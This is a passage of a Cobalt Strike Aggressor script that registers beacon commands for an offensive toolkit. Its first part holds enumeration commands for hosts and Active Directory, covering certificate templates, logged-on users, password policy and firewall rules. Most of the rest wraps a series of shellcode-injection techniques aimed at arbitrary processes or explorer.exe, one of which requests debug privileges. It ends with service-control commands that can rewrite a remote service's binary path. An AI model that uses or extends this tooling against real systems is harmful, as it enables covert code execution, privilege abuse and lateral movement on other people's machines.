		1 = DNS (Default)
		2 = NetWkstaGetInfo

Note: Output from this BOF is compatible with bofhound"
);



alias resources {
	beacon_inline_execute($1, readbof($1, "resources", $null, "T1082"), "go", $null);
}

beacon_command_register(
"resources",
"List available memory and space on the primary disk drive",
"Usage: resources");


alias uptime {
	beacon_inline_execute($1, readbof($1, "uptime", $null, "T1082"), "go", $null);
}

beacon_command_register(
"uptime",
"Lists system boot time",
"Usage: uptime");



alias enum_filter_driver{
	local('$args $system');

	$system = "";

	if ((size(@_) < 1) || (size(@_) > 2))
	{
		berror($1, beacon_command_detail("enum_filter_driver"));
		berror($1, "Invalid number of arguments");
		return;
	}
	$system = iff(-istrue $2, $2, $null);
	$args = bof_pack($1, "z", $system);
	beacon_inline_execute($1, readbof($1, "enum_filter_driver", "Retrieving list of filter drivers", "T1518.001"), "go", $args);
}

beacon_command_register(
	"enum_filter_driver",
	"Lists filter drivers on the system",
	"
Command: enum_filter_driver
Summary: This command displays a list of filter drivers installed on the 
         system. The results are returned in a CSV format with the type, name,
         and altitude number.
Usage:   enum_filter_driver <opt:system>
         system    Optional. Specifies the remote system to connect to. Do not 
                   include a system argument to indicate the command should be 
                   run on the local system.
Note:    You must have a valid login token for the system specified if not 
         local. This token can be obtained using make_token.
"
);



alias adv_audit_policies{
	local('$iswow64');
		
	$iswow64 = iff(-is64 $1 && barch($1) eq "x86", 1, 0);

	beacon_inline_execute($1, readbof($1, "adv_audit_policies", "Retrieving advanced security audit policies... iswow64: $iswow64", $null), "go", bof_pack($1, "i", $iswow64));
}

beacon_command_register(
	"adv_audit_policies",
	"Retrieves advanced security audit policies",
	"
Command: adv_audit_policies
Summary: This command retrieves the advanced security audit policies set in the
         group policy of the local system and/or domain.
Usage:   adv_audit_policies
"
);

alias listpipes
{
	btask($1, "Listing Named Pipes", "DS0023");
	bls($1, "//./pipe/");
}

beacon_command_register(
	"listpipes",
	"Lists local named pipes",
	"Usage: listpipes"
);
alias enumLocalSessions{
	beacon_inline_execute($1, readbof($1, "enumlocalsessions", $null, "T1033"), "go", $null);
}

beacon_command_register(
	"enumLocalSessions",
	"Enumerate the currently attached user sessions both local and over rdp",
	"Usage: enumLocalSessions"
);

alias findLoadedModule{
	local('$iswow64 $modname $procname $args');
	if(-is64 $1 && barch($1) eq "x86")
	{
		berror($1, "Unable to run this BOF properly when under WOW64 (32bit proc on 64bit host)");
		return;
	}
	if(size(@_) > 3 || size(@_) < 2){
		berror($1, "Invalid number of arguments");
		berror($1, beacon_command_detail("findLoadedModule"));
		return;
	}
	$modname = $2;
	$procname = iff(-istrue $3, $3, "");
	$args = bof_pack($1, "zz", $modname, $procname);
	beacon_inline_execute($1, readbof($1, "findLoadedModule", $null, $null), "go", $args);
}

beacon_command_register(
	"findLoadedModule",
	"Finds processes loading a specific dll",
	"Usage:
	findLoadedModule <part dll name> [opt: part proc name]
	
	Searches are done in *<part>* manner, so partial matches will hit
	If you specify a proc name then only processes matching that partial hit will be searched"
);


alias adcs_enum{
	local('$args');

	$domain = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Z", $domain);

	beacon_inline_execute($1, readbof($1, "adcs_enum", $null, $null), "go", $args);
}

beacon_command_register(
	"adcs_enum",
	"Enumerates CAs and templates in the AD using Win32 functions",
	"
Command: adcs_enum
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Acitive Directory Certificate Services using
         undocumented Win32 functions. It displays basic information as well 
         as the CA cert, flags, permissions, and similar information for the 
         templates.
Usage:   adcs_enum (domain)
		 domain		Optional. Specified domain otherwise uses current domain.
"
);


alias adcs_enum_com{
	local('$args');

	$args = $null;
	beacon_inline_execute($1, readbof($1, "adcs_enum_com", $null, $null), "go", $args);
}

beacon_command_register(
	"adcs_enum_com",
	"Enumerates CAs and templates in the AD using ICertConfig COM object",
	"
Command: adcs_enum_com
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Acitive Directory Certificate Services using 
         the ICertConfig, ICertRequest, and IX509CertificateTemplate COM 
         objects. It displays basic information as well as the CA cert, flags, 
         permissions, and similar information for the templates.
Usage:   adcs_enum_com
"
);


alias adcs_enum_com2{
	local('$args');

	$args = $null;
	beacon_inline_execute($1, readbof($1, "adcs_enum_com2", $null, $null), "go", $args);
}

beacon_command_register(
	"adcs_enum_com2",
	"Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object",
	"
Command: adcs_enum_com2
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Acitive Directory Certificate Services using 
         the IX509PolicyServerListManager, IX509PolicyServerUrl, 
         IX509EnrollmentPolicyServer, ICertificationAuthority, and 
         IX509CertificateTemplate COM objects. It displays basic information as
         well as the CA cert, flags, permissions, and similar information for
         the templates.
Usage:   adcs_enum_com2
"
);

alias vssenum{
	local('$hostname $sharename $args');
	if (size(@_) < 2)
	{
		berror($1, "Invalid number of arguments");
		berror($1, beacon_command_detail("vssenum"));
		return;
	}

	$hostname = $2;
	$sharename = iff(-istrue $3, $3, "C$");
	$args = bof_pack($1, "ZZ", $hostname, $sharename);
	blog($1, $hostname);
	beacon_inline_execute($1, readbof($1, "vssenum", $null, $null), "go", $args);			# backups and snapshots are referenced but not discovery

}



beacon_command_register(
	"vssenum",
	"Enumerate snapshots on a remote machine",
"Command: vssenum
If the target machine has volume snapshots this command will list there timestamps
This command will likely only work on windows server 2012 + with specific configurations
see https://techcommunity.microsoft.com/t5/storage-at-microsoft/vss-for-smb-file-shares/ba-p/425726 for more info

Usage: vssenum [hostname] (opt: sharename)

sharename defaults to C$ if not specified"
);

alias get_password_policy
{
	local('$server $args');

	if(size(@_) < 2)
	{
		berror($1, "Invalid number of arguments, must specify target server / DC");
		berror($1, beacon_command_detail("get_password_policy"));
		return;
	}
	$server = $2;
	$args = bof_pack($1, "Z", $server);
	beacon_inline_execute($1, readbof($1, "get_password_policy", $null, "T1201"), "go", $args);
}

beacon_command_register(
	"get_password_policy",
	"gets a server or DC's configured password policy",
	"Command: get_password_policy
Basically re-implements net accounts excluding calling out Computer role
If you target a DC with this it will be domain policies, otherwise its the policy for that local server
target \"\" for the local computer

Usage: get_password_policy [hostname]"
);

alias probe
{
	local('$host $port $args $portint');

	if(size(@_) < 3)
	{
		berror($1, "usage: probe <host> <port>");
		return;
	}
	$host = $2;
	$port = $3;
	$portint = parseNumber($port, 10);
	if ($portint < 1 || $portint > 65535) {
		berror($1, "usage: probe <host> <port>");
		berror($1, "Port out of range");
		return;
	}

	$args = bof_pack($1, "zi", $host, $port);
	beacon_inline_execute($1, readbof($1, "probe", $null, "T1046"), "go", $args);
}

beacon_command_register(
	"probe",
	"Check if a port is open",
	"Command: probe

Usage: probe <host> <port>"
);

alias list_firewall_rules
{
	beacon_inline_execute($1, readbof($1, "list_firewall_rules"), "go",  $null);
}

beacon_command_register(
	"list_firewall_rules",
	"List all windows firewall rules",
	"Command: list_firewall_rules

Usage: list_firewall_rules"
);

alias netloggedon{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Zi", $name, 0);
	beacon_inline_execute($1, readbof($1, "netloggedon", $null, "T1049"), "go", $args);
}

beacon_command_register(
	"netloggedon",
	"Returns users logged on the local (or a remote) machine - administrative rights needed",
	"netloggedon <\\computername>"
);

alias netloggedon2{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Zi", $name, 0);
	beacon_inline_execute($1, readbof($1, "netloggedon2", $null, "T1049"), "go", $args);
}

beacon_command_register(
	"netloggedon2",
	"Returns users logged on the local (or a remote) machine via NetWkstaUserEnum- administrative rights needed. Output is compatible with bofhound",
	"Usage: netloggedon2 <opt: computername>
	
Note: Output from this BOF is compatible with bofhound"
);

alias netuptime{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Zi", $name, 0);
	beacon_inline_execute($1, readbof($1, "netuptime", $null, "T1082"), "go", $args);
}

beacon_command_register(
	"netuptime",
	"Returns information about the boot time on the local (or a remote) machine",
	"netuptime <\\computername>"
);


alias nettime{
	local('$args $name')
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Z", $name);
	beacon_inline_execute($1, readbof($1, "nettime", $null, "T1082"), "go", $args);
}

beacon_command_register(
	"nettime",
	"Returns information about the current time on a remote (or local) machine. ",
		"
Command: nettime
Summary: This command displays the current time on a remote host. 
Usage:   enum_filter_driver <target>
         Ex: nettime target 
         nettime target.domain.local 
         nettime  

Note:    nettime will return the time of the localhost if target is null
"
);

alias regsession{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "z", $name);
	beacon_inline_execute($1, readbof($1, "regsession", $null, "T1049"), "go", $args);
}

beacon_command_register(
	"regsession",
	"Returns users logged on the local (or a remote) machine via the registry - administrative rights needed. Output is compatible with bofhound",
	"Usage: regsession <opt: computername>
	
Note: Output from this BOF is compatible with bofhound"
);


########################################
# Injection Commands
########################################


alias createremotethread
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("createremotethread"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("createremotethread"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("createremotethread"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "createremotethread"), "go", $args);
}

beacon_command_register(
    "createremotethread",
    "createremotethread injection technique",
    "
Command: createremotethread 
Summary: This command injects shellcode into a process using the 
         createremotethread technique.
Usage:   createremotethread <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias setthreadcontext
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("setthreadcontext"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("setthreadcontext"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("setthreadcontext"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "setthreadcontext"), "go", $args);
}

beacon_command_register(
    "setthreadcontext",
    "setthreadcontext injection technique",
    "
Command: setthreadcontext 
Summary: This command injects shellcode into a process using the 
         setthreadcontext technique.
Usage:   setthreadcontext <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias ntcreatethread
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("ntcreatethread"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("ntcreatethread"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("ntcreatethread"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "ntcreatethread"), "go", $args);
}

beacon_command_register(
    "ntcreatethread",
    "ntcreatethread injection technique",
    "
Command: ntcreatethread 
Summary: This command injects shellcode into a process using the 
         ntcreatethread technique in combination with loading our own version
         of the syscall commands from ntdll on disk.
Usage:   ntcreatethread <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias ntqueueapcthread
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("ntqueueapcthread"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("ntqueueapcthread"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("ntqueueapcthread"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "ntqueueapcthread"), "go", $args);
}

beacon_command_register(
    "ntqueueapcthread",
    "ntqueueapcthread injection technique",
    "
Command: ntqueueapcthread 
Summary: This command injects shellcode into a process using the 
         ntqueueapcthread technique in combination with loading our own version
         of the syscall commands from ntdll on disk.
Usage:   ntqueueapcthread <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias kernelcallbacktable
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("kernelcallbacktable"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("kernelcallbacktable"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("kernelcallbacktable"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "kernelcallbacktable"), "go", $args);
}

beacon_command_register(
    "kernelcallbacktable",
    "kernelcallbacktable injection technique",
    "
Command: kernelcallbacktable 
Summary: This command injects shellcode into a process using the 
         kernelcallbacktable technique in combination with loading our own 
         version of the syscall commands from ntdll on disk. This can only 
         target processes which handle window message (GUIs).
Usage:   kernelcallbacktable <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into, but this will not work with the
                    default of rundll32.exe.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias tooltip
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("tooltip"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("tooltip"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("tooltip"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "tooltip"), "go", $args);
}

beacon_command_register(
    "tooltip",
    "tooltip injection technique",
    "
Command: tooltip 
Summary: This command injects shellcode into a process using the tooltip 
         technique in combination with loading our own version of the syscall 
         commands from ntdll on disk. This can only target processes with 
         windows that have tooltips, e.g., explorer.exe.
Usage:   tooltip <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into, but this will not work with the
                    default of rundll32.exe.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias uxsubclassinfo
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(1 > size(@_) || 2 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("uxsubclassinfo"));
        return;
    }

    # Get the shellfile
    if(2 == size(@_))
    {
        $shellfile = $2;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("uxsubclassinfo"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "b", $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "uxsubclassinfo"), "go", $args);
}

beacon_command_register(
    "uxsubclassinfo",
    "uxsubclassinfo injection technique (targets explorer.exe only)",
    "
Command: uxsubclassinfo 
Summary: This command injects shellcode into explorer.exe using the 
         uxsubclassinfo in combination with loading our own version of the 
         syscall commands from ntdll on disk. This can only target explorer, so
         no need to specify the PID, but make sure your shellcode won't kill
         the process or thread.
Usage:   uxsubclassinfo <SHELLCODE>
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias clipboardinject
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("clipboardinject"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("clipboardinject"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("clipboardinject"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "clipboardinject"), "go", $args);
}

beacon_command_register(
    "clipboardinject",
    "clipboardinject injection technique",
    "
Command: clipboardinject 
Summary: This command injects shellcode into a process using the clipboardinject 
         technique in combination with loading our own version of the syscall 
         commands from ntdll on disk. This can only target processes with 
         windows that have a clipboardinject window, e.g., explorer.exe, 
         vmtoolsd.exe, or the svchost.exe on Windows 10 responsible for the
         clipboardinject service.
Usage:   clipboardinject <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into, but this will not work with the
                    default of rundll32.exe.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias conhost
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("conhost"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("conhost"));
        return;
    }

    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("conhost"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "conhost"), "go", $args);
}

beacon_command_register(
    "conhost",
    "conhost injection technique (targets conhost.exe only)",
    "
Command: conhost 
Summary: This command injects shellcode into a process using the conhost 
         technique in combination with loading our own version of the syscall 
         commands from ntdll on disk. This can only target console applications 
         with a conhost.exe child process. The injection actually occurs in the
         conhost.exe so target the PID. On Windows 7, the parent process of 
         conhost.exe is actually csrss.exe instead of the console application, 
         so this technique will not work.
Usage:   conhost <PID> <SHELLCODE>
         PID        Required. The PID to inject into. Enter '0' as the PID to 
                    have COBALTSTRIKE uses the spawnto to create a temporary 
                    process to inject into, but this will not work with the
                    default of rundll32.exe.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


alias ctray
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(1 > size(@_) || 2 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("ctray"));
        return;
    }

    # Get the shellfile
    if(2 == size(@_))
    {
        $shellfile = $2;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("ctray"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "b", $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "ctray"), "go", $args);
}

beacon_command_register(
    "ctray",
    "ctray injection technique (targets explorer.exe only)",
    "
Command: ctray 
Summary: This command injects shellcode into explorer.exe using the ctray 
         injection technique in combination with loading our own version of the 
         syscall commands from ntdll on disk. This can only target explorer, so
         no need to specify the PID, but make sure your shellcode won't kill
         the process or thread.
Usage:   ctray <SHELLCODE>
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.                
"
);


alias dde
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(1 > size(@_) || 2 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("dde"));
        return;
    }

    # Get the shellfile
    if(2 == size(@_))
    {
        $shellfile = $2;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("dde"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "b", $shellcode);

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "dde"), "go", $args);
}

beacon_command_register(
    "dde",
    "dde injection technique (targets explorer.exe only)",
    "
Command: dde 
Summary: This command injects shellcode into explorer.exe using the dde 
         injection technique in combination with loading our own version of the 
         syscall commands from ntdll on disk. This can only target explorer, so
         no need to specify the PID, but make sure your shellcode won't kill
         the process or thread.
Usage:   dde <SHELLCODE>
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
Warning: The injection technique causes the shellcode to be executed FOUR times
         so plan accordingly.                    
"
);


alias svcctrl
{
    local('$bid $pid $shellcode $shellfile $fp $args');

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("svcctrl"));
        return;
    }

    # Get the PID
    $pid = $2;
    if($pid < 0 || $pid > 65535)
    {
        berror($bid, "Invalid PID");
        berror($bid, beacon_command_detail("conhost"));
        return;
    }
    
    # Get the shellfile
    if(3 == size(@_))
    {
        $shellfile = $3;
    }
    else
    {
        prompt_file_open("Select shellcode", $null, false, $this);
        yield;
        $shellfile = $1;
    }

    # Get the shellcode
    if (!-canread $shellfile)
    {
        berror($bid, "Invalid SHELLCODE " . $shellfile . " - Cannot read file");
        berror($bid, beacon_command_detail("svcctrl"));
        return;
    }
    $fp = openf($shellfile);
    $shellcode = readb($fp, -1);
    closef($fp);

    # Pack the arguments
    $args = bof_pack($bid, "ib", $pid, $shellcode);

    blog($1, "Requesting to enable debug privs");
    bgetprivs($1, "SeDebugPrivilege");

    # Execute BOF
    beacon_inline_execute($bid, readbof_inject($bid, "svcctrl"), "go", $args);
}

beacon_command_register(
    "svcctrl",
    "svcctrl injection technique",
    "
Command: svcctrl 
Summary: This command injects shellcode into a process using the svcctrl 
         technique. This technique attempts to overwrite a service's internal 
         dispatch table in the targeted process, so the targeted process must
         be hosting services, e.g., svchost.exe or spoolsrv.exe.
Usage:   svcctrl <PID> <SHELLCODE>
         PID        Required. The PID to inject into. This technique can only 
                    target processes which are hosting services.
         SHELLCODE  Optional. The file name of the shellcode to inject. If not
                    specified on the command line, then you will be prompted to
                    select the file.
"
);


########################################
# Service Control functions
########################################

# sc_description <SVCNAME> <DESCRIPTION> <OPT:HOSTNAME>
alias sc_description
{
    local('$hostname $servicename $args $desc');

    if(size(@_) == 3)
    {
        $servicename = $2;
        $desc = $3;
        $hostname = $null;
    }
    else if (size(@_) == 4)
    {
        $servicename = $2;
        $desc = $3;
        $hostname = $4;
    }
    else
    {
        berror($1, beacon_command_detail("sc_description"));
        return;
    }

        $args = bof_pack($1, "zzz", $hostname, $servicename, $desc);
        beacon_inline_execute($1, readbof_remote($1, "sc_description"), "go", $args);

}

beacon_command_register(
    "sc_description",
    "Sets the description of an existing service",
    "
Command: sc_description 
Summary: This command sets the description of an existing service on the target 
         host.
Usage:   sc_description <SVCNAME> <DESCRIPTION> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         DESCRIPTION  Required. The description of the service.
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.
"
);

#sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
sub bsc_config
{
    local('$hostname $servicename $binpath $errormode $startmode $bid $args');
    $bid = $1;
    $servicename = $2;
    $binpath = $3;
    $errormode = $4;
    $startmode = $5;
    $hostname = $6;
    try {
        $junk = parseNumber($errormode, 10);
        $junk = parseNumber($startmode, 10);
    } catch $msg{
        berror($bid, beacon_command_detail('sc_config'));
        berror($bid, "either ignore or startmode is not a proper number");
        return;
    }
    if (($errormode < 0) || ($errormode > 3))
    {
        berror($bid, beacon_command_detail('sc_config'));
        berror($bid, "ignore is not a valid value");
        return;
    }
    if (($startmode < 2) || ($startmode > 4))
    {
        berror($bid, beacon_command_detail('sc_config'));
        berror($bid, "startmode is not a valid value");
        return;
    }
    $args = bof_pack($bid, "zzzss",  $hostname, $servicename, $binpath, $errormode, $startmode);
    beacon_inline_execute($bid, readbof_remote($1, "sc_config"), "go", $args);

}

#sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
alias sc_config
{
    local('$hostname $servicename $binpath $ignore $startmode $junk');

